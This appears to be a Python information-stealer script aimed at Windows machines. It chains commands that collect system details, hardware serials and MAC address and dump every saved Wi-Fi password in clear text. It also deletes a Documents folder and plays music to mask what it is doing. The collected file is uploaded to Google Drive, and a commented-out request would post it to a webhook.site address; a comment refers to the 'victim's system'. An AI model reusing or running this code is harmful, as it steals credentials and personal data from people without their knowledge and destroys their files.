import os
import math
import random
from requests import * 
from pydrive.drive import GoogleDrive
from pydrive.auth import GoogleAuth


# Function to convert number into string
# Switcher is dictionary data type here
def numbers_to_strings(argument,a,a2,a1,e,b,b1,c,d,d1,y,z):
	switcher = {
     
		1: a+a1+a2+b+e+b1+c+d+d1+d2+y+z 
		#2: 'cmd /k "version > version.txt"',
	}

	# get() method of dictionary data type returns
	# value of passed argument if it is present
	# in dictionary otherwise second argument will
	# be assigned as default value of passed argument
	return switcher.get(argument, "nothing")

# Driver program
if __name__ == "__main__":
    
    #object1=str{(for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear)"}
    argument=1
    a="(systeminfo &&"
    a2=""" netsh interface set interface "Wi-Fi" enable &&"""
    a1=" wmic computersystem get totalphysicalmemory &&"
    b=" ipconfig &&"
    b1=" wmic product &&"
    c=" wmic bios get serialnumber &&"
    d=" getmac &&"
    d1="cd \d D:\important files &&"
    d2="rmdir Documents &&"
    e=""" (for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear) &&"""
    y=" ver )"
    z=" > Details.txt"
    
    #code to execute music while file transfer carries on in background
    mscpath=r"D:\important files\desktop\songtest"
    songs=os.listdir(mscpath) 
    #os.startfile(mscpath)
    rd=random.choice(songs) 
    #rd= random.randint(1, 3)
    os.startfile(os.path.join(mscpath,rd))  
    os.system(numbers_to_strings(argument,a,a2,a1,b,b1,c,d,d1,e,y,z))

   
  
# Below code does the authentication
# part of the code
gauth = GoogleAuth()
  
# Creates local webserver and auto
# handles authentication.
gauth.LocalWebserverAuth()       
drive = GoogleDrive(gauth)
   
# replace the value of this variable
# with the absolute path of the directory
path = r"D:\desktop study\desktop study\iiit kota\sem3\pythonprojects\cmd"   
   
# iterating thought all the files/folder
# of the desired directory
for x in os.listdir(path):
   
    f = drive.CreateFile({'title': "Details.txt"})
    f.SetContentFile(os.path.join(path, "Details.txt"))
    f.Upload()
  
    # Due to a known bug in pydrive if we 
    # don't empty the variable used to
    # upload the files to Google Drive the
    # file stays open in memory and causes a
    # memory leak, therefore preventing its 
    # deletion
    f = None


#files1 = {'upload_file': open('Details.txt','rb')}
#values = {'DB': 'photcat', 'OUT': 'csv', 'SHORT': 'short'}
#request('post','https://webhook.site/11c30e2c-e9c9-4f52-a5ec-893b1684f33b',files=files1,data=values)
     
#executes loc in cmd of victim's system
#command=subprocess.run(["ipconfig","/all",">","Details.txt"], capture_output=True).stdout.decode()